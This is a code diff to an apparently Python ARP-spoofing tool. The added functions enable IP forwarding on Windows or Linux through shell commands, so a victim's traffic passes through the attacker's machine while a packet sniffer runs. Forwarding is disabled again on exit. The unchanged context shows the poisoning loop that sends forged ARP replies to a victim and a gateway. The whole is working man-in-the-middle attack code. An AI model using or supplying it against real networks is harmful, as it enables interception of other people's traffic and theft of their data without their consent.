@@ -4,6 +4,7 @@ import threading
 import time
 from sniffer import packet_sniffer
 import constants as c
+import os
 
 
 # MAC addresses (will be fetched dynamically)
@@ -27,6 +28,22 @@ def poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
         send(poison_victim)
         send(poison_gateway)
         time.sleep(2)
+        
+# Function to enable IP forwarding
+def enable_ip_forwarding():
+    if os.name == "nt":
+        os.system("netsh interface ipv4 set interface 1 forwarding=enabled")
+    else:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print("[*] IP forwarding enabled")
+
+# Function to disable IP forwarding
+def disable_ip_forwarding():
+    if os.name == "nt":
+        os.system("netsh interface ipv4 set interface 1 forwarding=disabled")
+    else:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print("[*] IP forwarding disabled")
 
 # Function to restore the ARP tables to their original state
 def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
@@ -48,6 +65,8 @@ if __name__ == "__main__":
         
         print(f"[*] Victim MAC: {victim_mac}")
         print(f"[*] Gateway MAC: {gateway_mac}")
+        
+        enable_ip_forwarding()
 
         # Start ARP poisoning in a separate thread
         poison_thread = threading.Thread(target=poison, args=(c.VICTIM_IP, victim_mac, c.GATEWAY_IP, gateway_mac))
@@ -60,4 +79,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("[*] Stopping the script...")
         restore(c.VICTIM_IP, victim_mac, c.GATEWAY_IP, gateway_mac)
+        disable_ip_forwarding()
         sys.exit(0)
